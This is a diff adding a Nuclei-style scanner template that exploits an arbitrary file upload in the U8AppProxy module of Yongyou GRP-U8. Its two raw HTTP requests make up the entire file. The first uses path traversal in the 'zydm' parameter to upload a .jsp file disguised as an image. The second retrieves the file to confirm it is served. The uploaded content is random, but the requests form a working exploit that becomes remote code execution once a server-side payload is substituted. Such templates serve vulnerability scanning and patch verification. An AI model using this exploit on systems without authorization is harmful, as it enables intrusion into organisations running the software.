@@ -1,0 +1,49 @@
+id: poc-yaml-yongyou-grp-u8-appproxy-anyfile-upload
+info:
+  name: Yongyou GRP-U8 U8AppProxy Arbitrary File Upload
+  author: ProjectDiscoveryAI
+  severity: critical
+  tags: file-upload
+  description: |
+    Exploits an arbitrary file upload vulnerability in Yongyou GRP-U8's U8AppProxy module.
+
+variables:
+  filename: "{{rand_base(6)}}"
+  content: "{{rand_base(32)}}"
+
+http:
+  - raw:
+      - |
+        POST /U8AppProxy?gnid=myinfo&id=saveheader&zydm=../../{{filename}} HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryW0vdr4bjEUTVj3Sw
+
+        ------WebKitFormBoundaryW0vdr4bjEUTVj3Sw
+        Content-Disposition: form-data; name="file"; filename="1.jsp"
+        Content-Type: image/png
+
+        {{content}}
+        ------WebKitFormBoundaryW0vdr4bjEUTVj3Sw--
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 500
+      - type: word
+        words:
+          - "apache"
+        part: body
+  - raw:
+      - |
+        POST /{{filename}}.jsp HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "{{content}}"
+        part: body
